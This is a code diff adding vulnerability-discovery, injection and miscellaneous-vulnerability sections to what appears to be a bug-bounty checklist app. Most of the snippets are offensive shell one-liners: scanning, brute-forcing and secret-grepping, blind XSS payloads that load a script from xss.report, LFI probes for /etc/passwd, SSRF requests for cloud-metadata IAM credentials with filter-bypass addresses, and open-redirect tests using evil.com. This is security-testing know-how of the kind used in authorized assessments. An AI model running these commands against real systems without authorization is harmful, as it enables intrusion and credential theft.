@@ -629,6 +629,485 @@ strings document.pdf | grep -i "password|secret|key"`,
     ],
   },
   {
+    id: 'vuln-discovery',
+    title: 'Vulnerability Discovery',
+    description: 'Active vulnerability testing and exploitation techniques',
+    estimatedTime: '180 minutes',
+    subSections: [
+      {
+        id: 'nuclei-automation',
+        title: 'Nuclei Automation',
+        estimatedTime: '20 minutes',
+        tasks: [
+          { id: 'na-1', label: 'Run Nuclei with custom templates' },
+          { id: 'na-2', label: 'Configure batch size and concurrency for speed' },
+          { id: 'na-3', label: 'Scan for known CVEs and exposures' },
+          { id: 'na-4', label: 'Use community template collections' },
+        ],
+        codeSnippets: [
+          {
+            title: 'Nuclei Scanning',
+            code: `nuclei -u https://target.com -bs 50 -c 30
+nuclei -l live_domains.txt -bs 50 -c 30
+
+# Use batch size flag to set how many templates to run at once
+# Concurrency flag defines how many domains to scan simultaneously
+
+# Custom template collection:
+# https://github.com/coffinxp/nuclei-templates`,
+          },
+        ],
+      },
+      {
+        id: 'sensitive-files',
+        title: 'Sensitive File Discovery',
+        estimatedTime: '15 minutes',
+        tasks: [
+          { id: 'sf-1', label: 'Filter URLs for sensitive file extensions' },
+          { id: 'sf-2', label: 'Check for backup files (.bak, .old, .backup)' },
+          { id: 'sf-3', label: 'Look for configuration files (.config, .env, .yml)' },
+          { id: 'sf-4', label: 'Search for database files (.sql, .db, .sqlite)' },
+          { id: 'sf-5', label: 'Find document files (pdf, doc, xls)' },
+        ],
+        codeSnippets: [
+          {
+            title: 'Sensitive File Filtering',
+            code: `cat allurls.txt | grep -E "\\.xls|\\.xml|\\.xlsx|\\.json|\\.pdf|\\.sql|\\.doc|\\.docx|\\.pptx|\\.txt|\\.zip|\\.tar\\.gz|\\.tgz|\\.bak|\\.7z|\\.rar|\\.log|\\.cache|\\.secret|\\.db|\\.backup|\\.yml|\\.gz|\\.config|\\.csv|\\.yaml|\\.md|\\.md5"
+
+cat allurls.txt | grep -E "\\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"`,
+          },
+          {
+            title: 'Google Dork for Documents',
+            code: `site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)`,
+          },
+        ],
+      },
+      {
+        id: 'hidden-params',
+        title: 'Hidden Parameter Discovery',
+        estimatedTime: '20 minutes',
+        tasks: [
+          { id: 'hp-1', label: 'Run passive parameter discovery with Arjun' },
+          { id: 'hp-2', label: 'Perform active parameter fuzzing' },
+          { id: 'hp-3', label: 'Test both GET and POST methods' },
+          { id: 'hp-4', label: 'Use custom wordlists for parameter names' },
+        ],
+        codeSnippets: [
+          {
+            title: 'Arjun Parameter Discovery',
+            code: `# Passive parameter discovery:
+arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"
+
+# Active parameter discovery with wordlist:
+arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers "User-Agent: Mozilla/5.0"
+
+# -oT sets output format to text
+# -t 10 uses 10 threads
+# --rate-limit 10 limits to 10 requests per second
+# --passive enables passive discovery
+# -m GET,POST tests both methods`,
+          },
+        ],
+      },
+      {
+        id: 'dir-bruteforce',
+        title: 'Directory & File Bruteforcing',
+        estimatedTime: '30 minutes',
+        tasks: [
+          { id: 'db-1', label: 'Run Dirsearch with recursive mode' },
+          { id: 'db-2', label: 'Use FFUF for high-speed fuzzing' },
+          { id: 'db-3', label: 'Test multiple file extensions' },
+          { id: 'db-4', label: 'Check for admin panels and backups' },
+          { id: 'db-5', label: 'Identify development and debug endpoints' },
+        ],
+        codeSnippets: [
+          {
+            title: 'Dirsearch',
+            code: `dirsearch -u https://example.com --full-url --deep-recursive -r
+
+dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1`,
+          },
+          {
+            title: 'FFUF Fuzzing',
+            code: `ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-Host: localhost" -t 100 -r -o results.json
+
+ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://target.com/FUZZ -fc 401,403,404 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf -ac -H "User-Agent: Mozilla/5.0" -r -t 60 --rate 100 -c
+
+# Payloads: https://github.com/coffinxp/payloads`,
+          },
+        ],
+      },
+      {
+        id: 'js-analysis-advanced',
+        title: 'JavaScript Analysis (Advanced)',
+        estimatedTime: '25 minutes',
+        tasks: [
+          { id: 'jsa-1', label: 'Hunt for JS files with Katana' },
+          { id: 'jsa-2', label: 'Extract secrets and API keys from JS' },
+          { id: 'jsa-3', label: 'Look for AWS keys, Firebase configs' },
+          { id: 'jsa-4', label: 'Analyze for hardcoded credentials' },
+          { id: 'jsa-5', label: 'Filter JS files by content type' },
+        ],
+        codeSnippets: [
+          {
+            title: 'JS File Hunting',
+            code: `echo example.com | katana -d 3 | grep -E "\\.js$" | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ -c 30
+
+cat jsfiles.txt | grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret"
+
+cat allurls.txt | grep -E "\\.js$" | httpx-toolkit -mc 200 -content-type | grep -E "application/javascript|text/javascript" | cut -d' ' -f1 | xargs -I% curl -s % | grep -E "(API_KEY|api_key|apikey|secret|token|password)"`,
+          },
+          {
+            title: 'Bulk JS Analysis',
+            code: `echo domain.com | katana -ps -d 2 | grep -E "\\.js$" | nuclei -t /nuclei-templates/http/exposures/ -c 30
+
+cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/`,
+          },
+          {
+            title: 'Content-Type Filtering',
+            code: `# HTML content Filtering
+echo domain | gau | grep -Eo '(\\/[^\\/]+)\\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'
+
+# JavaScript content Filtering
+echo domain | gau | grep '\\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'`,
+          },
+        ],
+      },
+      {
+        id: 'wordpress-testing',
+        title: 'WordPress Security Testing',
+        estimatedTime: '20 minutes',
+        tasks: [
+          { id: 'wp-1', label: 'Enumerate WordPress users' },
+          { id: 'wp-2', label: 'Scan for vulnerable plugins' },
+          { id: 'wp-3', label: 'Check for vulnerable themes' },
+          { id: 'wp-4', label: 'Identify WordPress version' },
+          { id: 'wp-5', label: 'Test for exposed admin panels' },
+        ],
+        codeSnippets: [
+          {
+            title: 'WPScan',
+            code: `wpscan --url https://site.com --disable-tls-checks --api-token <YOUR_API_TOKEN> -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
+
+# -e at: Enumerate all themes
+# -e ap: Enumerate all plugins
+# -e u: Enumerate users
+# --plugins-detection aggressive: Aggressive plugin detection
+# --force: Force scan even if WordPress not detected
+
+# Fuzzing wordlist: https://github.com/coffinxp/payloads/blob/main/coffin%40wp-fuzz.txt`,
+          },
+        ],
+      },
+      {
+        id: 'network-recon',
+        title: 'Network-Level Recon',
+        estimatedTime: '25 minutes',
+        tasks: [
+          { id: 'nr-1', label: 'Scan for open ports with Naabu' },
+          { id: 'nr-2', label: 'Perform full Nmap scan' },
+          { id: 'nr-3', label: 'Use Masscan for high-speed scanning' },
+          { id: 'nr-4', label: 'Identify running services and versions' },
+          { id: 'nr-5', label: 'Check for vulnerable services' },
+        ],
+        codeSnippets: [
+          {
+            title: 'Port Scanning',
+            code: `# Naabu with Nmap integration
+naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt
+
+# Nmap full scan
+nmap -p- --min-rate 1000 -T4 -A target.com -oA fullscan
+
+# Masscan for speed
+masscan -p0-65535 target.com --rate 100000 -oG masscan-results.txt`,
+          },
+        ],
+      },
+    ],
+  },
+  {
+    id: 'injection-testing',
+    title: 'Injection & XSS Testing',
+    description: 'SQL Injection, XSS, and other injection vulnerability testing',
+    estimatedTime: '120 minutes',
+    subSections: [
+      {
+        id: 'sql-injection',
+        title: 'SQL Injection Testing',
+        estimatedTime: '40 minutes',
+        tasks: [
+          { id: 'sqli-1', label: 'Identify SQL-prone technologies (ASP, PHP, JSP)' },
+          { id: 'sqli-2', label: 'Find endpoints with query parameters' },
+          { id: 'sqli-3', label: 'Test for error-based SQL injection' },
+          { id: 'sqli-4', label: 'Test for blind SQL injection' },
+          { id: 'sqli-5', label: 'Use SQLMap for automated testing' },
+        ],
+        codeSnippets: [
+          {
+            title: 'SQL Technology Detection',
+            code: `# For possible SQL technology detection:
+subfinder -dL subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
+
+# For single domain:
+subfinder -d http://example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'`,
+          },
+          {
+            title: 'SQL Endpoint Discovery',
+            code: `# For possible SQL Endpoints:
+echo http://site.com | gau | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep -E '\\?[^=]+=.+$'
+
+# This filters URLs with extensions commonly linked to SQL injection vulnerabilities`,
+          },
+        ],
+      },
+      {
+        id: 'xss-testing',
+        title: 'Cross-Site Scripting (XSS) Testing',
+        estimatedTime: '40 minutes',
+        tasks: [
+          { id: 'xss-1', label: 'Run automated XSS detection with Dalfox' },
+          { id: 'xss-2', label: 'Test reflected XSS with payload injection' },
+          { id: 'xss-3', label: 'Test for stored XSS in forms' },
+          { id: 'xss-4', label: 'Perform blind XSS testing' },
+          { id: 'xss-5', label: 'Test login/signup forms for XSS' },
+        ],
+        codeSnippets: [
+          {
+            title: 'Automated XSS Testing',
+            code: `echo "target.com" | gau | gf xss | uro | httpx -silent | Gxss -p Rxss | dalfox
+
+echo "example.com" | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln
+
+echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
+cat xss_output.txt | grep -oP '^URL: \\K\\S+' | sed 's/=.*/=/' | sort -u > final.txt`,
+          },
+          {
+            title: 'FFUF XSS Testing',
+            code: `ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr "<script>alert('XSS')</script>"`,
+          },
+          {
+            title: 'Blind XSS Testing',
+            code: `cat urls.txt | grep -E "(login|signup|register|forgot|password|reset)" | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/xss/ -severity critical,high
+
+subfinder -d example.com | gau | bxss -payload '"><script src=https://xss.report/c/coffinxp></script>' -header "X-Forwarded-For"
+
+subfinder -d example.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
+
+cat xss_params.txt | dalfox pipe --blind https://your-collaborator-url --waf-bypass --silence`,
+          },
+        ],
+      },
+      {
+        id: 'lfi-testing',
+        title: 'Local File Inclusion (LFI) Testing',
+        estimatedTime: '30 minutes',
+        tasks: [
+          { id: 'lfi-1', label: 'Identify LFI-prone parameters' },
+          { id: 'lfi-2', label: 'Test with /etc/passwd payload' },
+          { id: 'lfi-3', label: 'Use Nuclei LFI templates' },
+          { id: 'lfi-4', label: 'Try path traversal sequences' },
+          { id: 'lfi-5', label: 'Test Windows paths if applicable' },
+        ],
+        codeSnippets: [
+          {
+            title: 'Automated LFI Discovery',
+            code: `nuclei -l subs.txt -t /root/nuclei-templates/http/vulnerabilities/generic/generic-linux-lfi.yaml -c 30
+
+echo "https://example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\\*|\\$[^\\:]*):0:0:" -v
+
+gau target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'`,
+          },
+          {
+            title: 'Alternative LFI Method',
+            code: `echo 'https://example.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\\*|\\$[^\\:]*):0:0:"
+
+# Key components:
+# gf lfi: Filters URLs potentially vulnerable to LFI
+# qsreplace "FUZZ": Replaces parameter values with FUZZ keyword
+# ffuf: Fast web fuzzer for testing payloads
+# -mr "root:(x|\\*|\\$[^\\:]*):0:0:": Matches Linux passwd file format
+
+# Payloads: https://github.com/coffinxp/payloads/blob/main/lfi.txt`,
+          },
+          {
+            title: 'FFUF LFI Request Mode',
+            code: `ffuf -request lfi -request-proto https -w /root/wordlists/offensive\\ payloads/LFI\\ payload.txt -c -mr "root:"`,
+          },
+        ],
+      },
+    ],
+  },
+  {
+    id: 'misc-vulns',
+    title: 'Miscellaneous Vulnerabilities',
+    description: 'CORS, SSRF, Open Redirect, Git Exposure and more',
+    estimatedTime: '90 minutes',
+    subSections: [
+      {
+        id: 'cors-testing',
+        title: 'CORS Misconfiguration Testing',
+        estimatedTime: '20 minutes',
+        tasks: [
+          { id: 'cors-1', label: 'Manual CORS testing with curl' },
+          { id: 'cors-2', label: 'Check Access-Control-Allow-Origin header' },
+          { id: 'cors-3', label: 'Test with arbitrary origin' },
+          { id: 'cors-4', label: 'Use automated CORS scanners' },
+          { id: 'cors-5', label: 'Verify with custom exploit PoC' },
+        ],
+        codeSnippets: [
+          {
+            title: 'Manual CORS Testing',
+            code: `curl -H "Origin: http://example.com" -I https://domain.com/wp-json/
+
+# Detailed CORS analysis
+curl -H "Origin: http://example.com" -I https://domain.com/wp-json/ | grep -i -e "access-control-allow-origin" -e "access-control-allow-methods" -e "access-control-allow-credentials"`,
+          },
+          {
+            title: 'Automated CORS Testing',
+            code: `cat example.coms.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt
+
+python3 corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\\nCookie: SESSION=Hacked"
+
+python3 CORScanner.py -u https://example.com -d -t 10
+
+# CORS Exploit PoC: https://github.com/coffinxp/scripts/blob/main/CorsExploit.html`,
+          },
+        ],
+      },
+      {
+        id: 'subdomain-takeover',
+        title: 'Subdomain Takeover Detection',
+        estimatedTime: '15 minutes',
+        tasks: [
+          { id: 'sto-1', label: 'Run Subzy for takeover detection' },
+          { id: 'sto-2', label: 'Check for dangling DNS records' },
+          { id: 'sto-3', label: 'Verify SSL certificates' },
+          { id: 'sto-4', label: 'Manual verification with can-i-take-over-xyz' },
+        ],
+        codeSnippets: [
+          {
+            title: 'Subzy Takeover Detection',
+            code: `subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
+
+# This tool checks for subdomain takeover by:
+# - Testing multiple service providers
+# - Verifying SSL certificates
+# - Using high concurrency for speed
+# - Hiding failed attempts to reduce noise
+
+# Manual verification: https://github.com/EdOverflow/can-i-take-over-xyz`,
+          },
+        ],
+      },
+      {
+        id: 'git-exposure',
+        title: 'Git Repository Disclosure',
+        estimatedTime: '10 minutes',
+        tasks: [
+          { id: 'git-1', label: 'Check for exposed .git directories' },
+          { id: 'git-2', label: 'Look for directory listings' },
+          { id: 'git-3', label: 'Download and analyze git history' },
+          { id: 'git-4', label: 'Extract sensitive files from commits' },
+        ],
+        codeSnippets: [
+          {
+            title: 'Git Exposure Detection',
+            code: `cat domains.txt | grep "SUCCESS" | gf urls | httpx-toolkit -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe
+
+# This command:
+# - Filters successful responses
+# - Uses GF patterns to extract URLs
+# - Tests for .git/ directory exposure
+# - Looks for "Index of" in responses
+# - Checks for directory listing`,
+          },
+        ],
+      },
+      {
+        id: 'ssrf-testing',
+        title: 'SSRF Testing & Exploitation',
+        estimatedTime: '25 minutes',
+        tasks: [
+          { id: 'ssrf-1', label: 'Identify SSRF-prone parameters' },
+          { id: 'ssrf-2', label: 'Test for internal service access' },
+          { id: 'ssrf-3', label: 'Target cloud metadata endpoints' },
+          { id: 'ssrf-4', label: 'Try IP format bypass techniques' },
+          { id: 'ssrf-5', label: 'Test with DNS rebinding/callback' },
+        ],
+        codeSnippets: [
+          {
+            title: 'SSRF Parameter Discovery',
+            code: `# Look for common SSRF-prone parameters in URLs
+cat urls.txt | grep -E 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue=' | sort -u
+
+# Look for API/webhook integrations or cloud metadata patterns
+cat urls.txt | grep -i 'webhook\\|callback\\|upload\\|fetch\\|import\\|api' | sort -u
+
+# Nuclei for automated scanning
+cat urls.txt | nuclei -t nuclei-templates/vulnerabilities/ssrf/`,
+          },
+          {
+            title: 'SSRF Exploitation',
+            code: `# Basic SSRF to local services
+curl "https://target.com/page?url=http://127.0.0.1:80/"
+curl "https://target.com/page?url=http://localhost:8080"
+
+# Target internal cloud metadata
+curl "https://target.com/api?endpoint=http://169.254.169.254/latest/meta-data/"
+curl "https://target.com/api?endpoint=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+
+# Bypass filters with alternative IP formats
+http://127.0.0.1%23.google.com
+http://127.1
+http://[::1]/
+http://0x7f000001
+http://017700000001
+
+# DNS rebinding or callback for blind SSRF
+curl "https://target.com/page?url=http://yourdomain.burpcollaborator.net"
+
+# SSRFmap: https://github.com/swisskyrepo/SSRFmap`,
+          },
+        ],
+      },
+      {
+        id: 'open-redirect',
+        title: 'Open Redirect Testing',
+        estimatedTime: '20 minutes',
+        tasks: [
+          { id: 'or-1', label: 'Find redirect parameters in URLs' },
+          { id: 'or-2', label: 'Test with external domain payload' },
+          { id: 'or-3', label: 'Try bypass techniques' },
+          { id: 'or-4', label: 'Chain with other vulnerabilities' },
+        ],
+        codeSnippets: [
+          {
+            title: 'Open Redirect Parameter Discovery',
+            code: `cat final.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=|redirect_url=|redirect_to=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=" | tee redirect_params.txt
+
+# Using GF patterns
+cat final.txt | gf redirect | uro | sort -u | tee redirect_params.txt`,
+          },
+          {
+            title: 'Open Redirect Testing',
+            code: `cat redirect_params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
+
+subfinder -d vulnweb.com -all | httpx-toolkit -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"`,
+          },
+          {
+            title: 'Payload-based Testing',
+            code: `cat redirect_params.txt | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
+
+echo target.com -all | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
+
+subfinder -d target.com -all | httpx-toolkit -silent | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"`,
+          },
+        ],
+      },
+    ],
+  },
+  {
     id: 'final-guide',
     title: 'Final Guide',
     description: 'Final Checklist Summary Guide',
